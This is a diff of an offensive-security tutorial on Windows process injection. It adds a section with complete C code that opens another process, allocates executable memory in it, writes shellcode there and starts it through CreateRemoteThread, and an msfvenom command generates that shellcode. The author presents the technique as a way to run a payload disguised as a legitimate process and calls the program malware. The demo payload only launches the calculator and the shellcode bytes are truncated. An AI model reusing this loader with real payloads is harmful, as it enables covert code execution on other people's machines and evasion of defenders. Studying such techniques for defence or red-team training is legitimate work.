@@ -21,7 +21,7 @@ Process injection can be performed on any OS, including Linux, Windows and macOS
 
 ### Generating Shellcode
 
-There are different ways to generate a shellcode, but for simplicity purpose, I am going to stick with msfvenom calc payload which can be generated using the command below
+Shellcode is the actual payload which is executed in most cases often to gain remote access (or perform any other action) to a machine.  There are different ways to generate a shellcode, but for simplicity purpose, I am going to stick with msfvenom calc payload which can be generated using the command below
 
 ```bash
 $ msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f C -b "\x00\x0a\x0d"
@@ -31,7 +31,7 @@ $ msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f C -b "\x00\x0a\x0d"
 
 #### 1. Allocating space for our Shellcode
 
-First we need to allocate memory to store our shellcode in our process memory. We can do that with the help of [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function.
+First we need to allocate memory to store our shellcode in our process memory. We can do that with the help of [**VirtualAlloc**](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function.
 
 ```c
 /* Function Definition
@@ -96,7 +96,7 @@ VOID* pShellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | ME
 memcpy(pShellcodeAddress, shellcode, sizeof(shellcode));
 HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
 return 0;     // <----- this will exit main just after creating the thread
-}             //        so the thread doesn't get time to execute the shell
+}             //        so the thread doesn't get enough time to execute the shell
 ```
 
 The shellcode won’t run yet, why? because we didn’t let the thread to finish executing the code yet, we exit even before the thread has finished running the code which is why the calculator doesn’t spawn. So we need to wait for the thread to finish before we exit, we can do that by just using getchar / [Sleep](https://www.geeksforgeeks.org/sleep-function-in-c/) (which may not be the best ways) or rather [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject), which will wait until the thread has finished executing only after which we can move to the next code / instruction.
@@ -131,9 +131,226 @@ int main() {
 }
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>Executing our code to spawn a calculator</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p><em>Executing our code to spawn a calculator</em></p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Checking  the Payload through Process Hacker</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p><em>Checking  the Payload through Process Hacker</em></p></figcaption></figure>
 
 Nice, We are able to inject the shellcode into local process successfully!. \
 If there is any problem, we can add more debug statements to check what is actually happening.&#x20;
+
+### Remote Process Injection
+
+okay, now that we can inject the shellcode locally, let's try injecting it into a remote process. Using this, we can run our shellcode under the disguise of a legitimate process :imp:
+
+Now since we have already created our shellcode, I will skip that part.
+
+#### 1. Opening Handle to a Process
+
+First of all, for us to access / interact with another process, we require a ["**Process Handle**"](https://serverfault.com/questions/27248/what-is-a-process-handle), we can achieve this using the [**OpenProcess**](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function which will then provide us with the process handle but it requires a [**Pid (Process Identifier)**](https://www.ibm.com/docs/en/ztpf/2019?topic=process-id)**.** \
+\
+For Simplicity purpose, we will first open a notepad, get it's PID, and then give it to [**OpenProcess**](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function. after opening the notepad you can just type this into cmd to get the PID of your notepad process.
+
+```bash
+tasklist | findStr notepad
+```
+
+<div align="center">
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p><em>notepad.exe having PID 2992</em></p></figcaption></figure>
+
+</div>
+
+```c
+/* Function Definition
+HANDLE OpenProcess(
+  [in] DWORD dwDesiredAccess,
+  [in] BOOL  bInheritHandle,
+  [in] DWORD dwProcessId
+); */
+DWORD PID = atoi(argv[1]); // converting string to integer
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+```
+
+* <mark style="color:purple;">**dwDesiredAccess**</mark> is the desired access with which we want to open the process. This can be any of the [Process access rights](https://learn.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights).
+* <mark style="color:purple;">**bInheritHandle**</mark> is a bool value which tells whether the process created by this process aka child process would inherit the handle or not. we can keep this FALSE since we don't need it.
+* <mark style="color:purple;">**dwProcessId**</mark> is the Process Identifier of which we would want a Handle.
+
+#### 2. Allocate Memory for Shellcode
+
+Now we just have to follow the same methods shown in [Local Process Injection](process-injection.md#local-process-injection) again but in the context of the Remote Process. So we start with [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
+
+```c
+/*
+LPVOID VirtualAllocEx(
+  [in]           HANDLE hProcess,
+  [in, optional] LPVOID lpAddress,
+  [in]           SIZE_T dwSize,
+  [in]           DWORD  flAllocationType,
+  [in]           DWORD  flProtect
+); */
+pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+```
+
+As you might have noticed, this is very similar to the  [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function , only that we are provided a process handle in which we want to allocate the virtual memory.
+
+#### 3. Writing payload to allocated Memory
+
+We can use [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function to write inside a process memory.
+
+```c
+/* BOOL WriteProcessMemory(
+  [in]  HANDLE  hProcess, 
+  [in]  LPVOID  lpBaseAddress,
+  [in]  LPCVOID lpBuffer,
+  [in]  SIZE_T  nSize,
+  [out] SIZE_T  *lpNumberOfBytesWritten
+); */
+WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), 0);
+```
+
+* <mark style="color:purple;">hProcess</mark> being Process Handle.
+* <mark style="color:purple;">lpBaseAddress</mark> is the starting (base) of the Address where we want to write.
+* <mark style="color:purple;">lpBuffer</mark> is the buffer(payload) which we want to write.
+* <mark style="color:purple;">nSize</mark> is the size of the buffer.
+* <mark style="color:purple;">lpNumberOfBytesWritten</mark> is the bytes already written, 0 since we haven't written anything.
+
+#### 4. Creating a Remote Thread to execute our Payload
+
+We have now written our payload into the memory space of the safe process, now we can just create a remote thread to run our payload using CreateRemoteThread
+
+```c
+/* HANDLE CreateRemoteThread(
+  [in]  HANDLE                 hProcess,
+  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+  [in]  SIZE_T                 dwStackSize,
+  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
+  [in]  LPVOID                 lpParameter,
+  [in]  DWORD                  dwCreationFlags,
+  [out] LPDWORD                lpThreadId
+); */
+hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
+```
+
+Now that we have created a thread to execute our payload, we just have to wait for it as mentioned previously. but we also have to tidy things up after we have finished executing our payload.\
+Here's the final implementation.
+
+#### 5. Remote Process Injection PoC
+
+{% code title="ProcessInjection.c" fullWidth="false" %}
+```c
+#include <Windows.h>
+#include <stdio.h>
+
+unsigned char shellcode[] =
+"\xeb\x27....";
+
+int main(int argc, char* argv[]) {
+	
+	if (argc < 2) {
+		printf("[*] Usage: %s <PID> ", argv[0]);
+		return 0;
+	}
+	
+	DWORD		PID = NULL;
+	PVOID		pAddress;
+	HANDLE		hProcess = NULL,
+		hThread = NULL;
+
+	PID = atoi(argv[1]);
+	printf("Getting Handle to the Process with PID: %d\n", PID);
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+	pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), 0);
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+	
+	return 0;
+}
+
+
+```
+{% endcode %}
+
+### Error Handling
+
+We can also see information on how we can debug in case of any errors.\
+
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p><em>MSDN document for OpenProcess</em></p></figcaption></figure>
+
+We can have a basic check accordingly to check the value of hProcess & print error message accordingly. \
+The [GetLastError](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror) function is really important while debugging our malware and we would be \
+using this a lot.
+
+Here's the main function with added Debugging Information & Error Handling
+
+```c
+int main(int argc, char* argv[]) {
+	
+	if (argc < 2) {
+		printf("[*] Usage: %s <PID> ", argv[0]);
+		return 0;
+	}
+	
+	DWORD		PID = NULL;
+	PVOID		pAddress;
+	HANDLE		hProcess = NULL,
+		hThread = NULL;
+
+	PID = atoi(argv[1]);
+	printf("Getting Handle to the Process with PID: %d\n", PID);
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+	if (hProcess == NULL) {
+		printf("[-] Error Getting Handle to the Process, Got: %d\n", GetLastError());
+		return 1;
+	}
+	printf("[+] Opened Handle to the Process: %d\n", PID);
+	
+	pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	if (pAddress == NULL) {
+		printf("[-] Unable to Allocate Virtual Memory, Error: %d\n", GetLastError());
+		return 1;
+	}
+	printf("[+] Allocated Virtual Memory   @--0x%p\n", pAddress);
+	
+	WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), 0);
+	printf("[+] Wrote payload to the Process\n");
+	
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
+	if (hThread == NULL) {
+		printf("[-] Unable to Create Remote thread, Error: %d\n", GetLastError());
+		return 1;
+	}
+	printf("[#] Created Remote Thread!! \n");
+	WaitForSingleObject(hThread, INFINITE);
+	
+	if (hThread) CloseHandle(hThread);
+	if (hProcess) CloseHandle(hProcess);
+	printf("[+] Cleaning finished... exiting...\n");
+	
+	return 0;
+}
+```
+
+Now this looks wayy better than what we have done [before](process-injection.md#id-5.-remote-process-injection-poc), It's always good to have debug statements in order to understand better
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p><em>Remote Process Injection</em></p></figcaption></figure>
+
+Now, let's just try to give a random value as PID which doesn't exists, like 123123
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p><em>Random PID given</em> </p></figcaption></figure>
+
+Notice the GetLastError says 87, now if we go to the [System Error Codes](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-) page, we can see that the \
+error 87 corresponds to "incorrect parameter", and if we try to give a higher privilege process id as \
+an input (eg. 4 which is system process), we get a different error (5) which corresponds to "Access is denied" as it should be.
+
+<div align="center">
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p><em>Incorrect Parameter</em> </p></figcaption></figure>
+
+</div>
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p><em>Access Denied</em></p></figcaption></figure>
+
